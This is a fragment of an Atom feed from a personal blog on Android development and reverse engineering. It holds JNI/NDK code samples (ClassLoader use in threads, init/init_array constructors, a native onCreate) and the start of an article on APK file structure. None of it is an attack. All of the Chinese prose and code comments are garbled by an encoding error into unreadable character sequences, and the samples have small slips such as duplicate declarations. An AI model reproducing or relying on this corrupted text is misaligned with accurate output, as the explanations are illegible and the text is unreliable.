class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jobject ClassLoaderObj;</span><br><span class="line"><span class="comment">//å­çº¿ç¨‹ä¸­</span></span><br><span class="line">JNIEnv* env = nullptr;</span><br><span class="line"><span class="keyword">if</span>(globalVM-&gt;AttachCurrentThread(reinterpret_cast&lt;JNIEnv **&gt;(&amp;env), nullptr) != JNI_OK)&#123;</span><br><span class="line">LOGD(<span class="string">&quot;myThread GetEnv failed&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;myThread JNIEnv: %p&quot;</span>, env);</span><br><span class="line"></span><br><span class="line">    <span class="type">jclass</span> <span class="variable">ClassLoaderClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/ClassLoader&quot;</span>); <span class="comment">//å­çº¿ç¨‹ä¸­å¯ä»¥findclassè·å¾—ç³»ç»Ÿç±»</span></span><br><span class="line">    <span class="type">jmethodID</span> <span class="variable">loadClassID</span> <span class="operator">=</span> env-&gt;GetMethodID(ClassLoaderClazz, <span class="string">&quot;loadClass&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>);</span><br><span class="line">    <span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> static_cast&lt;jclass&gt;(env-&gt;CallObjectMethod(ClassLoaderObj, loadClassID, env-&gt;NewStringUTF(<span class="string">&quot;com.xiaojianbang.ndkdemo.MainActivity&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//jclass MainActivityClazz = env-&gt;FindClass(&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;);</span></span><br><span class="line"><span class="comment">//ä¸»çº¿ç¨‹ä¸­</span></span><br><span class="line"><span class="comment">// MainActivity.class.getClassLoader();</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;</span>);</span><br><span class="line"><span class="type">jclass</span> <span class="variable">classClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/Class&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">getClassLoaderID</span> <span class="operator">=</span> env-&gt;GetMethodID(classClazz, <span class="string">&quot;getClassLoader&quot;</span>, <span class="string">&quot;()Ljava/lang/ClassLoader;&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">tempClassLoaderObj</span> <span class="operator">=</span> env-&gt;CallObjectMethod(MainActivityClazz, getClassLoaderID);</span><br><span class="line">ClassLoaderObj = env-&gt;NewGlobalRef(tempClassLoaderObj);</span><br></pre></td></tr></table></figure><h2 id="initä¸initarray">initä¸initarray</h2><p>åœ¨soæ‰§è¡ŒJNI_OnLoadä¹‹å‰ï¼Œè¿˜ä¼šæ‰§è¡Œä¸¤ä¸ªæ„é€ å‡½æ•°initï¼Œinitarray</p><p>soåŠ å›ºï¼Œsoä¸­çš„å­—ç¬¦ä¸²åŠ å¯†ç­‰ç­‰ï¼Œä¸€èˆ¬ä¼šæŠŠç›¸å…³ä»£ç æ”¾åˆ°è¿™é‡Œ</p><p>initä½¿ç”¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init()&#123;  <span class="comment">//å‡½æ•°åå¿…é¡»ä¸º_init åœ¨idaä¸­è¢«ç¼–è¯‘ä¸ºinit_proc</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initarrayä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">200</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">101</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br></pre></td></tr></table></figure><p>å½“å‡½æ•°å…¨å†™æˆç¬¬ä¸€ä¸ªæ ¼å¼ï¼Œæ‰§è¡Œé¡ºåºä»ä¸Šåˆ°ä¸‹ã€‚</p><p>å½“å‡½æ•°æœ‰æ•°å­—æ—¶ï¼šæ•°å­—è¶Šå°è¶Šå…ˆæ‰§è¡Œã€‚</p><p>æœ‰æ•°å­—å’Œæ²¡æœ‰æ•°å­—ï¼šæ²¡æœ‰æ•°å­—æœ€åæ‰§è¡Œ</p><p>å³constructor åé¢çš„å€¼ï¼Œè¾ƒå°çš„å…ˆæ‰§è¡Œï¼Œæœ€å¥½ä»100ä»¥åå¼€å§‹ç”¨ï¼Œå¦‚æœ constructor åé¢æ²¡æœ‰è·Ÿå€¼ï¼Œé‚£ä¹ˆæŒ‰å®šä¹‰çš„é¡ºåºï¼Œä»ä¸Šå¾€ä¸‹æ‰§è¡Œã€‚</p><h2 id="onCreateçš„nativeåŒ–">onCreateçš„nativeåŒ–</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="type">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_xiaojianbang_ndkdemo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz, jobject saved_instance_state)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement onCreate()</span></span><br><span class="line">    <span class="comment">// super.onCreate(savedInstanceState);</span></span><br><span class="line">    jclass AppCompatActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(thiz,AppCompatActivityClazz, onCreateID, saved_instance_state);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getLayoutInflater()</span></span><br><span class="line">    <span class="comment">//android.app.Activity getLayoutInflater</span></span><br><span class="line">    jclass ActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;android/app/Activity&quot;</span>);</span><br><span class="line">    jmethodID getLayoutInflaterID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityClazz, <span class="string">&quot;getLayoutInflater&quot;</span>, <span class="string">&quot;()Landroid/view/LayoutInflater;&quot;</span>);</span><br><span class="line">    jobject LayoutInflater = env-&gt;<span class="built_in">CallObjectMethod</span>(thiz, getLayoutInflaterID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding = ActivityMainBinding.inflate(getLayoutInflater());</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding inflate</span></span><br><span class="line">    <span class="comment">// public static ActivityMainBinding inflate(LayoutInflater inflater)</span></span><br><span class="line">    jclass ActivityMainBindingClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/xiaojianbang/ndkdemo/databinding/ActivityMainBinding&quot;</span>);</span><br><span class="line">    jmethodID inflateID = env-&gt;<span class="built_in">GetStaticMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;inflate&quot;</span>, <span class="string">&quot;(Landroid/view/LayoutInflater;)Lcom/xiaojianbang/ndkdemo/databinding/ActivityMainBinding;&quot;</span>);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;ActivityMainBindingClazz %p&quot;</span>, ActivityMainBindingClazz);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;inflateID %p&quot;</span>, inflateID);</span><br><span class="line">    jobject ActivityMainBindingObj = env-&gt;<span class="built_in">CallStaticObjectMethod</span>(ActivityMainBindingClazz, inflateID, LayoutInflater);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding.getRoot()</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding</span></span><br><span class="line">    <span class="comment">// public ConstraintLayout getRoot()</span></span><br><span class="line">    jmethodID getRootID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;getRoot&quot;</span>, <span class="string">&quot;()Landroidx/constraintlayout/widget/ConstraintLayout;&quot;</span>);</span><br><span class="line">    jobject ConstraintLayout = env-&gt;<span class="built_in">CallObjectMethod</span>(ActivityMainBindingObj, getRootID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setContentView(binding.getRoot());</span></span><br><span class="line">    jmethodID setContentViewID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;setContentView&quot;</span>, <span class="string">&quot;(Landroid/view/View;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallVoidMethod</span>(thiz, setContentViewID, ConstraintLayout);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ğŸ‘NDKå¼€å‘åŸºæœ¬æ“ä½œçš„è®°å½•</summary>
    
    
    
    <category term="NDKå¼€å‘" scheme="https://zxk1ng.github.io/categories/NDK%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="NDKå¼€å‘" scheme="https://zxk1ng.github.io/tags/NDK%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>AndroidåŸºç¡€çŸ¥è¯†</title>
    <link href="https://zxk1ng.github.io/posts/7e4211d.html"/>
    <id>https://zxk1ng.github.io/posts/7e4211d.html</id>
    <published>2025-01-15T06:58:31.000Z</published>
    <updated>2025-01-15T07:14:39.045Z</updated>
    
    <content type="html"><![CDATA[<h1>AndroidåŸºç¡€æ€§çŸ¥è¯†</h1><h2 id="apkæ–‡ä»¶ç»“æ„">apkæ–‡ä»¶ç»“æ„</h2><p>apkæ–‡ä»¶åç¼€ä¸º.apkã€‚å°±æ˜¯å®‰å“ä¸Šçš„å®‰è£…åŒ…ï¼Œè€Œapkæ–‡ä»¶å…¶å®å°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè§£å‹ç¼©ã€‚apkæ–‡ä»¶é‡Œé¢ä¸€èˆ¬åŒ…æ‹¬ä»¥ä¸‹éƒ¨åˆ†ï¼šé™æ€èµ„æºæ–‡ä»¶(assets)ï¼Œåº“æ–‡ä»¶(lib)ï¼Œç­¾åæ–‡ä»¶(META-INF)ï¼Œç¼–è¯‘èµ„æºæ–‡ä»¶(res)ï¼Œé…ç½®æ¸…å•æ–‡ä»¶(AndroidManifest.xml)ï¼Œæ ¸å¿ƒä»£ç æ–‡ä»¶(classes.dex)å’Œèµ„æºæ˜ å°„æ–‡ä»¶(resources.arsc)ç­‰ã€‚<img src="/posts/7e4211d.htm/image-20231016174722001.png" alt="image-20231016174722001"></p><h3 id="image-20231016175007953assetsæ–‡ä»¶å¤¹"><img src="/posts/7e4211d.htm/image-20231016175007953.png" alt="image-20231016175007953">assetsæ–‡ä»¶å¤¹</h3><p>assets è¿™é‡Œå­˜æ”¾çš„æ˜¯é™æ€èµ„æºæ–‡ä»¶(å›¾ç‰‡ï¼Œè§†é¢‘ç­‰)ã€‚è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„èµ„æºæ–‡ä»¶ä¸ä¼šè¢«ç¼–è¯‘ï¼Œè€Œæ˜¯ç›´æ¥æ‰“åŒ…è¿›åº”ç”¨ç¨‹åºä¸­ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸æ˜¯ä¸€äº›é™æ€èµ„æºï¼Œå¦‚å›¾ç‰‡ã€éŸ³é¢‘ã€æ–‡æœ¬æ–‡ä»¶ç­‰ã€‚assetsä¸­çš„èµ„æºè®¿é—®é€Ÿåº¦è¾ƒå¿«ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå¼€å‘è€…ä¼šå°†åº”ç”¨ç¨‹åºä¸­çš„é™æ€æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€åŸå§‹æ•°æ®æˆ–è€…å…¶ä»–ä¸å¸¸æ”¹å˜çš„æ–‡ä»¶æ”¾åœ¨ assets æ–‡ä»¶å¤¹ä¸­ã€‚</p><h3 id="libæ–‡ä»¶å¤¹">libæ–‡ä»¶å¤¹</h3><p><a href="http://xn--q8s43uvp1bpxe.so">é‡Œé¢å­˜æ”¾.so</a>(åŠ¨æ€é“¾æ¥åº“)æ–‡ä»¶ï¼Œå®ƒåŒ…å«åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶è¢«è°ƒç”¨ã€‚è¿™äº›åº“é€šå¸¸åŒ…å«è®¸å¤šå¸¸è§çš„å‡½æ•°å’Œç¨‹åºï¼Œlibæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸åŒç³»ç»Ÿæ¶æ„çš„soæ–‡ä»¶ï¼Œå¯é€‚ç”¨äºä¸åŒç¯å¢ƒä¸­ï¼Œrmeabi-v7aç›®å½•åŸºæœ¬é€šç”¨æ‰€æœ‰androidè®¾å¤‡ï¼Œarm64-v8aç›®å½•åªé€‚ç”¨äº64ä½çš„androidè®¾å¤‡ï¼Œx86ç›®å½•å¸¸è§ç”¨äºandroidæ¨¡æ‹Ÿå™¨ï¼Œx86-64ç›®å½•é€‚ç”¨äºæ”¯æŒx86_64æ¶æ„çš„Androidè®¾å¤‡ã€‚</p><p>åœ¨å®‰å“ç³»ç»Ÿä¸­åº“æ–‡ä»¶åˆ†ä¸ºä¸¤ç§ï¼šä¸€ç§æ˜¯å…±äº«åº“æ–‡ä»¶ï¼Œå¦ä¸€ç§æ˜¯æœ¬åœ°åº“æ–‡ä»¶ã€‚</p><p>å…±äº«åº“æ–‡ä»¶å¯ä¾›å¤šä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œæé«˜è¿è¡Œæ•ˆç‡ã€‚å…±äº«åº“æ–‡ä»¶ä»¥.soä¸ºåç¼€ï¼Œ<a href="http://xn--libc-zx5fppk7lw85aqxan35c3vblx8gjj0c.xn--solibm-j76j.so">å¸¸è§çš„å…±äº«åº“æ–‡ä»¶æ˜¯libc.soå’Œlibm.so</a></p><p>libæ–‡ä»¶å¤¹ä¸‹çš„æ˜¯æœ¬åœ°åº“æ–‡ä»¶ï¼Œä¸ºç‰¹å®šåº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„ã€‚</p><h3 id="META-INFæ–‡ä»¶å¤¹">META-INFæ–‡ä»¶å¤¹</h3><p>META-INFæ–‡ä»¶å¤¹æ˜¯å­˜æ”¾æ•°å­—ç­¾åç›¸å…³æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼ŒåŒ…å«ä»¥ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ol><li>MANIFEST.MFï¼šæ˜¯ä¸€ä¸ªæ‘˜è¦æ¸…å•æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†apkæ–‡ä»¶ä¸­é™¤è‡ªå·±ä»¥å¤–æ‰€æœ‰æ–‡ä»¶çš„æ•°å­—æ‘˜è¦(åç§°å’Œå“ˆå¸Œå€¼)ï¼Œç”¨äºç¡®ä¿APKæ–‡ä»¶çš„å®Œæ•´æ€§ã€‚</li><li>CERT.SFï¼šç”¨äºå­˜å‚¨é€šè¿‡ç§é’¥åŠ å¯†åå¾—åˆ°çš„MANIFEST.MFæ–‡ä»¶çš„æ•°å­—ç­¾åä¿¡æ¯ä»¥åŠMANIFEST.MFæ–‡ä»¶ä¸­æ•°å­—æ‘˜è¦çš„æ•°å­—ç­¾åä¿¡æ¯ã€‚å³å­˜æ”¾ä½¿ç”¨ç§é’¥åŠ å¯†åçš„æ•°å­—æ‘˜è¦ä¿¡æ¯ã€‚</li><li>CERT.PSAï¼šåŒ…å«è§£å¯†ä½¿ç”¨çš„public keyå’Œå¯¹æ–‡ä»¶ç­¾åæ—¶æ‰€ä½¿ç”¨çš„æ•°å­—è¯ä¹¦ã€‚</li></ol><p>ä¹‹ï¼ŒMETA-INFæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶æ˜¯ç”¨äºä¿æŠ¤APKæ–‡ä»¶çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§çš„é‡è¦æ–‡ä»¶ï¼Œå¯ä»¥ç¡®ä¿APKæ–‡ä»¶æ¥è‡ªåˆæ³•çš„å¼€å‘è€…ï¼Œå¹¶ä¸”æ²¡æœ‰è¢«ç¯¡æ”¹è¿‡ã€‚</p><p>APKåœ¨å®‰è£…APKæ—¶ï¼Œä¼šéªŒè¯APKçš„æ•°å­—ç­¾åæ˜¯å¦åˆæ³•ï¼ŒéªŒè¯è¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li>æå–APKæ–‡ä»¶ä¸­çš„æ•°å­—è¯ä¹¦ã€‚</li><li>ä»æ•°å­—è¯ä¹¦ä¸­æå–å…¬é’¥ã€‚</li><li>ä½¿ç”¨è¯¥å…¬é’¥å¯¹APKæ–‡ä»¶ä¸­çš„æ•°å­—ç­¾åè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°æ•°å­—æ‘˜è¦ã€‚</li><li>å¯¹APKæ–‡ä»¶è¿›è¡ŒHashè¿ç®—ï¼Œç”Ÿæˆæ•°å­—æ‘˜è¦ã€‚</li><li>æ¯”è¾ƒæ­¥éª¤3å’Œæ­¥éª¤4ä¸­ç”Ÿæˆçš„æ•°å­—æ‘˜è¦æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è®¤ä¸ºæ•°å­—ç­¾ååˆæ³•ï¼Œå¦åˆ™è®¤ä¸ºæ•°å­—ç­¾åä¸åˆæ³•ã€‚</li></ol><h3 id="é…ç½®æ¸…å•æ–‡ä»¶-AndroidManifest-xml">é…ç½®æ¸…å•æ–‡ä»¶(AndroidManifest.xml)</h3><p>AndroidManifest.xmlæ˜¯Androidåº”ç”¨ç¨‹åºä¸­æœ€é‡è¦çš„æ–‡ä»¶ä¹‹ä¸€ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚åº”ç”¨ç¨‹åºçš„åç§°ã€å›¾æ ‡ã€ç‰ˆæœ¬å·ã€æƒé™ã€ç»„ä»¶ï¼ˆActivityã€Serviceã€BroadcastReceiverã€Content Providerï¼‰ç­‰ç­‰ã€‚</p><h4 id="1-manifestæ ‡ç­¾">1.manifestæ ‡ç­¾</h4><p>manifestæ ‡ç­¾æ˜¯AndroidManifest.xmlæ–‡ä»¶çš„æ ¹æ ‡ç­¾ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚åŒ…åã€ç‰ˆæœ¬å·ã€SDKç‰ˆæœ¬ã€åº”ç”¨ç¨‹åºçš„åç§°å’Œå›¾æ ‡ç­‰ç­‰ã€‚</p><h4 id="2-applicationæ ‡ç­¾">2.applicationæ ‡ç­¾</h4><p>applicationæ ‡ç­¾æ˜¯åº”ç”¨ç¨‹åºçš„ä¸»è¦æ ‡ç­¾ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ç»„ä»¶ï¼Œå¦‚Activity(æ´»åŠ¨)ã€Service(æœåŠ¡)ã€Broadcast Receiver(å¹¿æ’­æ¥æ”¶å™¨)ã€Content  Provider(å†…å®¹æä¾›è€…)ç­‰ç­‰ã€‚åœ¨applicationæ ‡ç­¾ä¸­ï¼Œä¹Ÿå¯ä»¥è®¾ç½®åº”ç”¨ç¨‹åºçš„å…¨å±€å±æ€§ï¼Œå¦‚ä¸»é¢˜ã€æƒé™ç­‰ç­‰ã€‚</p><h4 id="3-activityæ ‡ç­¾">3.activityæ ‡ç­¾</h4><p>activityæ ‡ç­¾å®šä¹‰äº†ä¸€ä¸ªActivityç»„ä»¶ï¼Œå®ƒåŒ…å«äº†Activityçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚Activityçš„åç§°ã€å›¾æ ‡ã€ä¸»é¢˜ã€å¯åŠ¨æ¨¡å¼ç­‰ç­‰ã€‚åœ¨activityæ ‡ç­¾ä¸­ï¼Œè¿˜å¯ä»¥å®šä¹‰Activityçš„å¸ƒå±€ã€Intentè¿‡æ»¤å™¨ç­‰ç­‰ã€‚</p><h4 id="4-serviceæ ‡ç­¾">4.serviceæ ‡ç­¾</h4><p>serviceæ ‡ç­¾å®šä¹‰äº†ä¸€ä¸ªServiceç»„ä»¶ï¼Œå®ƒåŒ…å«äº†Serviceçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚Serviceçš„åç§°ã€å›¾æ ‡ã€å¯åŠ¨æ¨¡å¼ç­‰ç­‰ã€‚åœ¨serviceæ ‡ç­¾ä¸­ï¼Œè¿˜å¯ä»¥å®šä¹‰Serviceçš„Intentè¿‡æ»¤å™¨ç­‰ç­‰ã€‚</p><h4 id="5-receiveræ ‡ç­¾">5.receiveræ ‡ç­¾</h4><p>receiveræ ‡ç­¾å®šä¹‰äº†ä¸€ä¸ªBroadcastReceiverç»„ä»¶ï¼Œå®ƒåŒ…å«äº†BroadcastReceiverçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚BroadcastReceiverçš„åç§°ã€å›¾æ ‡ã€æƒé™ç­‰ç­‰ã€‚åœ¨receiveræ ‡ç­¾ä¸­ï¼Œè¿˜å¯ä»¥å®šä¹‰BroadcastReceiverçš„Intentè¿‡æ»¤å™¨ç­‰ç­‰ã€‚</p><h4 id="6-provideræ ‡ç­¾">6.provideræ ‡ç­¾</h4><p>provideræ ‡ç­¾å®šä¹‰äº†ä¸€ä¸ªContent Providerç»„ä»¶ï¼Œå®ƒåŒ…å«äº†Content Providerçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚Content  Providerçš„åç§°ã€å›¾æ ‡ã€æƒé™ç­‰ç­‰ã€‚åœ¨provideræ ‡ç­¾ä¸­ï¼Œè¿˜å¯ä»¥å®šä¹‰Content Providerçš„URIå’ŒMime Typeç­‰ç­‰ã€‚</p><h4 id="7-uses-permissionæ ‡ç­¾">7.uses-permissionæ ‡ç­¾</h4><p>uses-permissionæ ‡ç­¾å®šä¹‰äº†åº”ç”¨ç¨‹åºéœ€è¦çš„æƒé™ï¼Œå¦‚è®¿é—®ç½‘ç»œã€è¯»å–SDå¡ç­‰ç­‰ã€‚åœ¨åº”ç”¨ç¨‹åºå®‰è£…æ—¶ï¼Œç³»ç»Ÿä¼šæç¤ºç”¨æˆ·æˆæƒè¿™äº›æƒé™ã€‚</p><p>æ·»åŠ sdå¡ç›¸åº”æƒé™å¤– è¿˜éœ€è¦<code>android:requestLegacyExternalStorage=&quot;true&quot;</code></p><h4 id="8-uses-featureæ ‡ç­¾">8.uses-featureæ ‡ç­¾</h4><p>uses-featureæ ‡ç­¾å®šä¹‰äº†åº”ç”¨ç¨‹åºéœ€è¦çš„ç¡¬ä»¶æˆ–è½¯ä»¶ç‰¹æ€§ï¼Œå¦‚æ‘„åƒå¤´ã€GPSç­‰ç­‰ã€‚åœ¨åº”ç”¨ç¨‹åºå®‰è£…æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è®¾å¤‡æ˜¯å¦æ”¯æŒè¿™äº›ç‰¹æ€§ã€‚</p><h3 id="resources-arscæ–‡ä»¶">resources.arscæ–‡ä»¶</h3><p>resources.arscå®ƒæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰èµ„æºä¿¡æ¯ï¼Œä¾‹å¦‚å¸ƒå±€æ–‡ä»¶ã€å­—ç¬¦ä¸²ã€å›¾ç‰‡ç­‰ã€‚è¿™ä¸ªæ–‡ä»¶åœ¨åº”ç”¨ç¨‹åºç¼–è¯‘è¿‡ç¨‹ä¸­ç”±aaptå·¥å…·ç”Ÿæˆï¼Œå¹¶è¢«æ‰“åŒ…è¿›APKæ–‡ä»¶ä¸­ã€‚</p><p>resources.arscæ–‡ä»¶çš„ä¸»è¦ä½œç”¨æ˜¯æä¾›èµ„æºçš„ç´¢å¼•å’Œæ˜ å°„å…³ç³»ã€‚åº”ç”¨ç¨‹åºé€šå¸¸æ˜¯é€šè¿‡èµ„æº IDåœ¨è¿™ä¸ªèµ„æºæ˜ å°„è¡¨ä¸­å¯»æ‰¾å¯¹åº”çš„èµ„æºã€‚å½“åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®Rç±»ä¸­çš„IDæ¥æŸ¥æ‰¾å¯¹åº”çš„èµ„æºï¼Œå¹¶å°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¾›åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡è§£æresources.arscæ–‡ä»¶å’ŒRç±»å®ç°çš„ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥æ–¹ä¾¿åœ°è®¿é—®å’Œä½¿ç”¨èµ„æºï¼Œè€Œä¸éœ€è¦æ‰‹åŠ¨å¤„ç†èµ„æºæ–‡ä»¶çš„ä½ç½®å’Œå‘½åç­‰é—®é¢˜ã€‚</p><h3 id="resæ–‡ä»¶å¤¹">resæ–‡ä»¶å¤¹</h3><p>resæ–‡ä»¶å¤¹ï¼Œå­˜æ”¾çš„ä¹Ÿæ˜¯èµ„æºæ–‡ä»¶ï¼Œä¸assetsæ–‡ä»¶å¤¹ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ç¼–è¯‘åçš„èµ„æºæ–‡ä»¶ã€‚resçš„æ¯ä¸ªå­æ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾ç‰¹å®šç±»å‹çš„èµ„æºæ–‡ä»¶ã€‚åœ¨Androidåº”ç”¨ç¨‹åºå¼€å‘ä¸­ï¼Œèµ„æºæ–‡ä»¶é€šå¸¸æ˜¯ä»¥XMLæ ¼å¼å­˜å‚¨çš„ï¼Œå¦‚å¸ƒå±€æ–‡ä»¶ã€å­—ç¬¦ä¸²èµ„æºã€é¢œè‰²èµ„æºç­‰ã€‚</p><h4 id="drawable-æ–‡ä»¶å¤¹">drawable æ–‡ä»¶å¤¹</h4><p>ç”¨æ¥å­˜æ”¾å›¾ç‰‡èµ„æºæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä½å›¾æ–‡ä»¶ï¼ˆ.png, .jpg, .gif ç­‰ï¼‰å’ŒçŸ¢é‡å›¾æ–‡ä»¶ï¼ˆ.svgï¼‰ã€‚</p><h4 id="layoutæ–‡ä»¶å¤¹">layoutæ–‡ä»¶å¤¹</h4><p>ç”¨æ¥å­˜æ”¾å¸ƒå±€æ–‡ä»¶ï¼Œå¸ƒå±€æ–‡ä»¶ç”¨æ¥æè¿°åº”ç”¨ç¨‹åºçš„ç•Œé¢ç»“æ„ã€‚</p><h4 id="values-æ–‡ä»¶å¤¹">values 